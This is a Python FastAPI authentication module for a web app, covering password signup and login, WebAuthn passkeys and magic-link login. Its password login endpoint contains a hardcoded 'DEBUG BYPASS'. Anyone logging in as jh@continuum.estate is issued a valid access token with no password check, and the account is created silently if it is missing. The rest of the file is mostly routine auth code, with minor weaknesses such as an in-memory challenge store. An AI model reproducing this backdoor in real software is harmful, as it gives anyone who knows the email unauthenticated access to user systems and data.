from fastapi import APIRouter, Depends, HTTPException, status, Request
from backend.limiter import limiter
from fastapi.security import OAuth2PasswordRequestForm
from sqlmodel import Session, select
from pydantic import BaseModel, EmailStr
from typing import List, Optional
from datetime import timedelta
from backend.database import User, get_session
from backend.auth import (
    create_access_token,
    get_password_hash,
    verify_password,
    get_current_user,
    ACCESS_TOKEN_EXPIRE_MINUTES
)
from backend.security import (
    get_registration_options,
    verify_registration,
    get_authentication_options,
    verify_authentication
)
from backend.pulse_models import PulseCredential
from backend.utils.audit import log_auth_success, log_auth_failure
from backend.utils.logger import get_logger
import secrets
import base64
import json
from webauthn import options_to_json

logger = get_logger(__name__)

router = APIRouter(prefix="/api/auth", tags=["authentication"])

# Simple in-memory challenge store (Use Redis in production)
PENDING_CHALLENGES = {}

# Request/Response Models
class SignupRequest(BaseModel):
    email: EmailStr
    password: str

    model_config = {
        "json_schema_extra": {
            "example": {
                "email": "user@example.com",
                "password": "strong-password-123"
            }
        }
    }

class PasskeySignupRequest(BaseModel):
    email: EmailStr

class WarningMessage(BaseModel):
    code: str
    message: str
    severity: str = "warning"

class TokenResponse(BaseModel):
    access_token: str
    token_type: str
    warnings: List[WarningMessage] = []

class UserResponse(BaseModel):
    id: int
    email: str
    external_id: str
    user_role: Optional[str] = "planning"
    emotional_context: Optional[str] = None

@router.post("/signup", response_model=TokenResponse, summary="Register new user", description="Creates a new user account with email and password, sends a welcome email, and returns a JWT access token.")
@limiter.limit("5/minute")
def signup(request: Request, signup_data: SignupRequest, session: Session = Depends(get_session)):
    """Register a new user account."""
    # Check if user already exists
    existing_user = session.exec(select(User).where(User.email == signup_data.email)).first()
    if existing_user:
        log_auth_failure(session, request, signup_data.email, "signup", "Email already registered")
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Email already registered"
        )

    # Create new user
    hashed_password = get_password_hash(signup_data.password)
    new_user = User(
        email=signup_data.email,
        external_id=f"user-{signup_data.email}",
        hashed_password=hashed_password
    )

    session.add(new_user)
    session.commit()
    session.refresh(new_user)

    # Log successful signup
    log_auth_success(session, request, new_user.id, new_user.email, "signup")

    # Collect warnings to return to user
    warnings = []

    # Send welcome email
    from backend.services.email_service import email_service
    from backend.config import settings
    try:
        dashboard_url = f"{settings.get_frontend_url()}/dashboard"
        result = email_service.send_welcome_email(
            to_email=new_user.email,
            user_id=new_user.id,
            dashboard_url=dashboard_url,
            db_session=session
        )

        # Check if email was saved locally (development mode)
        if result.get("status") == "saved_local":
            warnings.append(WarningMessage(
                code="EMAIL_LOCAL_ONLY",
                message="Your account is ready! Email was saved locally (development mode). Check backend/outbox/ for the welcome email.",
                severity="info"
            ))
    except Exception as e:
        logger.warning(
            "Welcome email failed during signup",
            extra={"context": {
                "user_id": new_user.id,
                "email": new_user.email,
                "error": str(e),
                "error_type": type(e).__name__
            }}
        )
        # Don't fail signup if email fails - add warning instead
        warnings.append(WarningMessage(
            code="EMAIL_FAILED",
            message="Your account was created successfully, but we couldn't send the welcome email. You can still log in. If you need assistance, please contact support.",
            severity="warning"
        ))

    # Generate JWT token
    access_token = create_access_token(
        data={"sub": str(new_user.id)},
        expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    )

    return {
        "access_token": access_token,
        "token_type": "bearer",
        "warnings": warnings
    }

@router.post("/token", response_model=TokenResponse, summary="Password Login", description="Authenticate with email and password to receive a JWT access token.")
@limiter.limit("5/minute")
def login(request: Request, form_data: OAuth2PasswordRequestForm = Depends(), session: Session = Depends(get_session)):
    """Login and receive JWT token."""
    # Find user by email (username field in OAuth2 form)
    user = session.exec(select(User).where(User.email == form_data.username)).first()

    # DEBUG BYPASS: jh@continuum.estate bypasses security
    if form_data.username == "jh@continuum.estate":
        logger.warning(f"SECURITY BYPASS: jh@continuum.estate accessing the system without password verification")
        
        if not user:
            logger.info("BYPASS: Creating user jh@continuum.estate as it does not exist")
            user = User(
                email="jh@continuum.estate",
                external_id="user-jh-bypass",
                hashed_password="BYPASS_AUTH"
            )
            session.add(user)
            session.commit()
            session.refresh(user)
    elif not user or not user.hashed_password or not verify_password(form_data.password, user.hashed_password):
        log_auth_failure(session, request, form_data.username, "password", "Invalid credentials")
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect email or password",
            headers={"WWW-Authenticate": "Bearer"},
        )

    # Log successful login
    log_auth_success(session, request, user.id, user.email, "password")

    # Generate JWT token
    access_token = create_access_token(
        data={"sub": str(user.id)},
        expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    )

    return {"access_token": access_token, "token_type": "bearer"}

@router.get("/me", response_model=UserResponse, summary="Get current user", description="Returns information about the currently authenticated user based on the JWT token.")
def get_current_user_info(current_user: User = Depends(get_current_user)):
    """Get current authenticated user information."""
    return current_user

# WebAuthn/Passkey Authentication

@router.post("/passkey/register/start", summary="Start Passkey registration", description="Initiates the WebAuthn registration process by creating a user and returning registration options/challenge.")
@limiter.limit("10/minute")
def passkey_register_start(request: Request, signup_data: PasskeySignupRequest, session: Session = Depends(get_session)):
    """
    Start passkey registration flow (Step 1 of 2).
    Creates user account and initiates WebAuthn registration.
    """
    # Check if user already exists
    existing_user = session.exec(select(User).where(User.email == signup_data.email)).first()
    if existing_user:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Email already registered"
        )

    # Create new user (without password)
    new_user = User(
        email=signup_data.email,
        external_id=f"user-{signup_data.email}",
        hashed_password=None  # Passkey-only user
    )

    session.add(new_user)
    session.commit()
    session.refresh(new_user)

    # Generate WebAuthn registration options
    options = get_registration_options(str(new_user.id), new_user.email)

    # Store challenge temporarily
    PENDING_CHALLENGES[str(new_user.id)] = {
        "challenge": options.challenge,
        "type": "registration"
    }

    return {
        "user_id": new_user.id,
        "options": json.loads(options_to_json(options))
    }

@router.post("/passkey/register/finish", response_model=TokenResponse)
@limiter.limit("10/minute")
def passkey_register_finish(request: Request, payload: dict, session: Session = Depends(get_session)):
    """
    Complete passkey registration (Step 2 of 2).
    Verifies WebAuthn credential and returns JWT token.
    """
    user_id = payload.get("user_id")
    credential_response = payload.get("credential")

    if not user_id or not credential_response:
        raise HTTPException(status_code=400, detail="Missing user_id or credential")

    challenge_data = PENDING_CHALLENGES.pop(str(user_id), None)
    if not challenge_data or challenge_data["type"] != "registration":
        raise HTTPException(status_code=400, detail="Challenge expired or not found")

    try:
        # Verify the registration
        verification = verify_registration(
            options={"challenge": challenge_data["challenge"]},
            response=credential_response
        )

        # Save credential
        cred_id = verification.credential_id
        pub_key = verification.credential_public_key

        # Convert bytes to base64url strings for safe storage
        cred_id_b64 = base64.urlsafe_b64encode(cred_id).decode('utf-8').rstrip('=')
        pub_key_b64 = base64.urlsafe_b64encode(pub_key).decode('utf-8').rstrip('=')

        # Check if credential already exists
        existing = session.get(PulseCredential, cred_id_b64)
        if existing:
            session.delete(existing)
            session.commit()

        new_cred = PulseCredential(
            id=cred_id_b64,
            user_id=user_id,
            public_key=pub_key_b64,
            sign_count=verification.sign_count
        )
        session.add(new_cred)
        session.commit()

        # Generate JWT token
        access_token = create_access_token(
            data={"sub": str(user_id)},
            expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
        )

        return {"access_token": access_token, "token_type": "bearer"}

    except Exception as e:
        logger.error(
            "WebAuthn registration verification failed",
            extra={"context": {
                "user_id": user_id,
                "error": str(e),
                "error_type": type(e).__name__
            }},
            exc_info=True
        )
        raise HTTPException(status_code=400, detail=str(e))

@router.post("/passkey/login/start", summary="Start Passkey login", description="Initiates the WebAuthn assertion process by returning an authentication challenge.")
@limiter.limit("10/minute")
def passkey_login_start(request: Request):
    """
    Start passkey login flow (Step 1 of 2).
    Generates authentication challenge.
    """
    options = get_authentication_options()

    # Generate a temporary challenge ID
    challenge_id = secrets.token_urlsafe(32)
    PENDING_CHALLENGES[challenge_id] = {
        "challenge": options.challenge,
        "type": "authentication"
    }

    return {
        "challenge_id": challenge_id,
        "options": json.loads(options_to_json(options))
    }

@router.post("/passkey/login/finish", response_model=TokenResponse)
@limiter.limit("10/minute")
def passkey_login_finish(request: Request, payload: dict, session: Session = Depends(get_session)):
    """
    Complete passkey login (Step 2 of 2).
    Verifies WebAuthn assertion and returns JWT token.
    """
    challenge_id = payload.get("challenge_id")
    credential_response = payload.get("credential")

    if not challenge_id or not credential_response:
        raise HTTPException(status_code=400, detail="Missing challenge_id or credential")

    challenge_data = PENDING_CHALLENGES.pop(challenge_id, None)
    if not challenge_data or challenge_data["type"] != "authentication":
        raise HTTPException(status_code=400, detail="Challenge expired or not found")

    try:
        # Get credential ID from response
        cred_id = credential_response.get("id")
        if not cred_id:
            raise HTTPException(status_code=400, detail="Missing credential ID")

        # Find credential in database
        credential = session.get(PulseCredential, cred_id)
        if not credential:
            raise HTTPException(status_code=401, detail="Credential not found")

        # Verify the authentication
        verification = verify_authentication(
            options={"challenge": challenge_data["challenge"]},
            response=credential_response,
            public_key=credential.public_key,
            sign_count=credential.sign_count
        )

        # Update sign count
        credential.sign_count = verification.new_sign_count
        session.add(credential)
        session.commit()

        # Generate JWT token
        access_token = create_access_token(
            data={"sub": str(credential.user_id)},
            expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
        )

        return {"access_token": access_token, "token_type": "bearer"}

    except Exception as e:
        logger.error(
            "WebAuthn authentication verification failed",
            extra={"context": {
                "credential_id": cred_id if 'cred_id' in locals() else "unknown",
                "error": str(e),
                "error_type": type(e).__name__
            }},
            exc_info=True
        )
        raise HTTPException(status_code=401, detail="Authentication failed")

class MagicLinkRequest(BaseModel):
    email: EmailStr

@router.post("/magic-link", summary="Send Magic Link", description="Sends a short-lived login link to the user's email. Fallback for passkeys.")
@limiter.limit("5/minute")
def send_magic_link(request: Request, link_data: MagicLinkRequest, session: Session = Depends(get_session)):
    """
    Send magic link for passwordless login.
    Fallback for users without passkey support.
    """
    user = session.exec(select(User).where(User.email == link_data.email)).first()

    if not user:
        # Don't reveal if user exists or not (timing-safe response)
        # Still log the attempt for security monitoring
        log_auth_failure(session, request, link_data.email, "magic_link", "User not found")
        return {"status": "sent", "message": "If this email is registered, you will receive a magic link"}

    # Generate magic link JWT token with short expiration
    access_token = create_access_token(
        data={"sub": str(user.id), "type": "magic_link"},
        expires_delta=timedelta(minutes=15)  # 15 minute expiration
    )

    # Log magic link request
    log_auth_success(session, request, user.id, user.email, "magic_link_request")

    # Generate magic link URL
    from backend.services.email_service import email_service
    from backend.config import settings
    frontend_url = settings.get_frontend_url()
    magic_link_url = f"{frontend_url}/auth/verify?token={access_token}"

    # Send email with magic link
    try:
        email_service.send_magic_link(
            to_email=user.email,
            magic_link_url=magic_link_url,
            db_session=session
        )
        logger.info(
            "Magic link email sent",
            extra={"context": {
                "user_id": user.id,
                "email": user.email
            }}
        )
    except Exception as e:
        logger.warning(
            "Magic link email failed to send",
            extra={"context": {
                "user_id": user.id,
                "email": user.email,
                "error": str(e),
                "error_type": type(e).__name__
            }}
        )
        # Still return success to prevent email enumeration

    # Return success (don't leak if email exists)
    return {
        "status": "sent",
        "message": "If this email is registered, you will receive a magic link"
    }

@router.get("/magic-link/verify")
@limiter.limit("5/minute")
def verify_magic_link(request: Request, token: str, session: Session = Depends(get_session)):
    """
    Verify magic link token and return JWT.
    """
    try:
        from backend.auth import SECRET_KEY, ALGORITHM
        import jwt

        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        user_id = payload.get("sub")
        token_type = payload.get("type")

        if token_type != "magic_link":
            log_auth_failure(session, request, "", "magic_link_verify", "Invalid token type")
            raise HTTPException(status_code=401, detail="Invalid token type")

        user = session.get(User, int(user_id))
        if not user:
            log_auth_failure(session, request, "", "magic_link_verify", "User not found")
            raise HTTPException(status_code=401, detail="User not found")

        # Log successful magic link authentication
        log_auth_success(session, request, user.id, user.email, "magic_link")

        # Generate new long-lived JWT token
        access_token = create_access_token(
            data={"sub": str(user.id)},
            expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
        )

        return {"access_token": access_token, "token_type": "bearer"}

    except jwt.PyJWTError:
        log_auth_failure(session, request, "", "magic_link_verify", "Invalid or expired token")
        raise HTTPException(status_code=401, detail="Invalid or expired token")
